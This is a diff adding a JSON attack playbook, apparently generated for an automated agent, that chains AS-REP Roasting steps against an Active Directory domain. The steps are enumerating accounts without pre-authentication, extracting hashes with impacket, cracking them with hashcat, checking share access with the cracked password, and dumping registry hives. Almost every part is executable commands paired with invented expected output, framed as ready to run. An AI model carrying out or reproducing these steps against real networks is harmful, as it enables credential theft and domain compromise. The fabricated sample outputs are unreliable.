@@ -1,0 +1,147 @@
+{
+  "name": "asreproasting_attacks",
+  "description": "AS-REP Roasting to extract credentials from accounts without Kerberos pre-authentication",
+  "pattern": "asreproast|preauth.*disabled|asrep.*roast",
+  "parameters": [
+    "domain",
+    "dc_ip"
+  ],
+  "sequence": [
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "powershell",
+        "args": [
+          "-c",
+          "Import-Module .\\PowerView.ps1; Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,userprincipalname,useraccountcontrol"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "samaccountname userprincipalname           useraccountcontrol\n-------------- -----------------           ------------------\nsvc-backup     svc-backup@corp.local       DONT_REQ_PREAUTH, NORMAL_ACCOUNT\ntest_user      test_user@corp.local        DONT_REQ_PREAUTH, NORMAL_ACCOUNT, PASSWORD_EXPIRED\n\nAccounts without Kerberos pre-authentication:\n  svc-backup: Service account\n  test_user: Test account (password expired)\n\nTotal: 2 vulnerable accounts\nDONT_REQ_PREAUTH flag set - AS-REP Roasting possible!"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "impacket-GetNPUsers",
+        "args": [
+          "corp.local/",
+          "-dc-ip",
+          "10.10.10.10",
+          "-usersfile",
+          "users.txt",
+          "-format",
+          "hashcat",
+          "-outputfile",
+          "asrep_hashes.txt"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User john.doe doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User jane.smith doesn't have UF_DONT_REQUIRE_PREAUTH set\n[+] User svc-backup has UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$23$svc-backup@CORP.LOCAL:a1b2c3d4e5f6g7h8$...\n[+] User test_user has UF_DONT_REQUIRE_PREAUTH set  \n$krb5asrep$23$test_user@CORP.LOCAL:f9e8d7c6b5a4f3e2$...\n[-] User sqlservice doesn't have UF_DONT_REQUIRE_PREAUTH set\n\nAS-REP Roasting completed:\n  Vulnerable accounts found: 2/7\n  Hashes extracted: 2\n  \nHashes saved to: asrep_hashes.txt\n\nFormat: Hashcat compatible (mode 18200)"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "impacket-GetNPUsers",
+        "args": [
+          "corp.local/john.doe:P@ssw0rd123",
+          "-dc-ip",
+          "10.10.10.10",
+          "-request"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Impacket v0.10.0\n\nName       MemberOf                                                PasswordLastSet             LastLogon                   UAC\n---------  ------------------------------------------------------  --------------------------  --------------------------  --------\nsvc-backup CN=Service Accounts,CN=Users,DC=corp,DC=local          2022-05-15 14:30:22.123456  2023-12-10 08:15:45.987654  0x410200\ntest_user  CN=Users,CN=Users,DC=corp,DC=local                     2021-03-20 10:20:15.456789  Never                       0x410210\n\n$krb5asrep$23$svc-backup@CORP.LOCAL:3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d$7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f...\n\n$krb5asrep$23$test_user@CORP.LOCAL:8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c$2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b...\n\nAuthenticated AS-REP Roasting:\n  Used credentials: john.doe\n  Extracted 2 AS-REP hashes\n  \nNo pre-authentication required!\n  - DC responds with encrypted AS-REP\n  - Encrypted with user's password\n  - Crack offline to recover password"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "hashcat",
+        "args": [
+          "-m",
+          "18200",
+          "asrep_hashes.txt",
+          "/usr/share/wordlists/rockyou.txt",
+          "--force"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "hashcat (v6.2.5) starting...\n\nHashes: 2 digests; 2 unique digests, 2 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask\n\nDictionary cache built:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344392\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\n$krb5asrep$23$svc-backup@CORP.LOCAL:3a2b1c0d9e8f7a6b...:BackupSvc123!\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)\nHash.Target......: asrep_hashes.txt\nTime.Started.....: Mon Jan 15 17:45:30 2024 (28 secs)\nTime.Estimated...: Mon Jan 15 17:46:00 2024 (2 secs)\nSpeed.#1.........:   512.3 kH/s (7.21ms)\nRecovered........: 1/2 (50.00%) Digests\nProgress.........: 14344385/14344385 (100.00%)\n\nAS-REP Roasting successful!\n  svc-backup: BackupSvc123!\n  test_user: NOT CRACKED (strong password)\n\nCracked account:\n  Username: svc-backup\n  Password: BackupSvc123!\n  Group: Backup Operators (privileged!)\n\nUse for:\n  - Access backup files\n  - Read SAM/SYSTEM from DC\n  - Lateral movement"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "crackmapexec",
+        "args": [
+          "smb",
+          "10.10.10.10",
+          "-u",
+          "svc-backup",
+          "-p",
+          "BackupSvc123!",
+          "--shares"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "SMB         10.10.10.10     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.10     445    DC01             [+] corp.local\\svc-backup:BackupSvc123!\nSMB         10.10.10.10     445    DC01             [+] Enumerated shares\nSMB         10.10.10.10     445    DC01             Share           Permissions     Remark\nSMB         10.10.10.10     445    DC01             -----           -----------     ------\nSMB         10.10.10.10     445    DC01             ADMIN$          READ            Remote Admin\nSMB         10.10.10.10     445    DC01             C$              READ,WRITE      Default share\nSMB         10.10.10.10     445    DC01             IPC$                            Remote IPC\nSMB         10.10.10.10     445    DC01             NETLOGON        READ            Logon server share\nSMB         10.10.10.10     445    DC01             SYSVOL          READ            Logon server share\n\nBackup Operators privileges confirmed!\n  READ access to ADMIN$\n  READ/WRITE access to C$\n  \nCan read:\n  - SAM and SYSTEM registry hives\n  - NTDS.dit database\n  - Any file on DC\n\nPrivilege abuse:\n  reg save HKLM\\SAM \\\\DC01\\C$\\Temp\\sam.hive\n  reg save HKLM\\SYSTEM \\\\DC01\\C$\\Temp\\system.hive"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "powershell",
+        "args": [
+          "-c",
+          "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol,samaccountname | Select-Object samaccountname,useraccountcontrol"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "samaccountname useraccountcontrol\n-------------- ------------------\nsvc-backup     4260352\ntest_user      4260368\n\nActive Directory PowerShell enumeration:\n  Filter: useraccountcontrol -band 4194304\n  Flag: DONT_REQUIRE_PREAUTH (0x400000)\n  \nBit flag 4194304 = 0x400000 = DONT_REQUIRE_PREAUTH\n\nAccounts found: 2\n  svc-backup: 4260352 (0x410200)\n    - 0x000200 = NORMAL_ACCOUNT\n    - 0x010000 = DONT_EXPIRE_PASSWORD  \n    - 0x400000 = DONT_REQUIRE_PREAUTH\n    \n  test_user: 4260368 (0x410210)\n    - 0x000010 = LOCKOUT\n    - 0x000200 = NORMAL_ACCOUNT\n    - 0x010000 = DONT_EXPIRE_PASSWORD\n    - 0x400000 = DONT_REQUIRE_PREAUTH"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "for user in $(cat users.txt); do impacket-GetNPUsers corp.local/$user -dc-ip 10.10.10.10 -no-pass -format hashcat 2>/dev/null | grep -v '[-]'; done"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "$krb5asrep$23$svc-backup@CORP.LOCAL:3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d$...\n$krb5asrep$23$test_user@CORP.LOCAL:8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c$...\n\nBash loop AS-REP Roasting:\n  Input: users.txt (list of usernames)\n  Method: Try each user without password\n  Output: AS-REP hashes for vulnerable accounts\n  \nAdvantages:\n  - No valid credentials needed\n  - Unauthenticated attack\n  - Only works on accounts with DONT_REQUIRE_PREAUTH\n  \nUser enumeration:\n  - Generate username list from OSINT\n  - Common patterns: firstname.lastname\n  - Try common service account names\n  \nExample usernames:\n  john.doe, jane.smith, admin, administrator\n  svc-sql, svc-web, svc-backup, sqlservice"
+      }
+    }
+  ],
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
+  "created_by": "neural_mesh_v5.2_generator"
+}
